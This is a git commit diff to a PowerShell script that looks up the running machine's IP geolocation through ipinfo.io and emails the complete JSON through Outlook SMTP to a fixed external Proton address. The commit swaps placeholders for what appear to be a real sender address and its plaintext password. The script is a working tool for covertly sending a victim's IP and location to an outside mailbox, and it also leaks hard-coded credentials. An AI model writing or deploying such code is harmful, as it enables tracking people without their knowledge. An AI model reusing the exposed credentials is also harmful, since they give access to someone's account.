5a2eefe34d7fb08e706ae122503ab85531192188
Fixo1 <francois.machere@epitech.eu>
2024-04-28 12:55:10 +0200

    Update get-location-send-email.ps1
    Email adresses

--- get-location-send-email.ps1
+++ get-location-send-email.ps1
@@ -1,23 +1,22 @@
 # Fetch IP-based geolocation
 $ipInfo = Invoke-RestMethod -Uri 'http://ipinfo.io/json'
-$location = $ipInfo.loc
-$ip = $ipInfo.ip
+$jsonContent = $ipInfo | ConvertTo-Json -Depth 10
 
-# Setup SMTP variables
-$SmtpServer = 'smtp.yourserver.com'
-$SmtpUser = 'your-email@yourdomain.com'
-$SmtpPass = 'your-password'
-$Message = "IP: $ip; Location: $location"
+# Setup SMTP variables (using Outlook.com)
+$SmtpServer = 'smtp-mail.outlook.com'
+$SmtpUser = 'UsulMadhi@outlook.com'  # Your Outlook.com email address
+$SmtpPass = 'Eusebe2000'  # Your Outlook.com password
+$Message = $jsonContent
 
 # Email properties
 $MailMessage = New-Object System.Net.Mail.MailMessage
-$MailMessage.From = 'your-email@yourdomain.com'
-$MailMessage.To.Add('recipient-email@domain.com')
-$MailMessage.Subject = 'Geolocation Data'
+$MailMessage.From = 'UsulMadhi@outlook.com'
+$MailMessage.To.Add('UsulMadhi@proton.me')
+$MailMessage.Subject = 'Complete Geolocation Data'
 $MailMessage.Body = $Message
 
 # Send Email
-$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) # Adjust port if needed
+$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) # Port for TLS
 $SMTPClient.EnableSsl = $true
 $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($SmtpUser, $SmtpPass)
 $SMTPClient.Send($MailMessage)
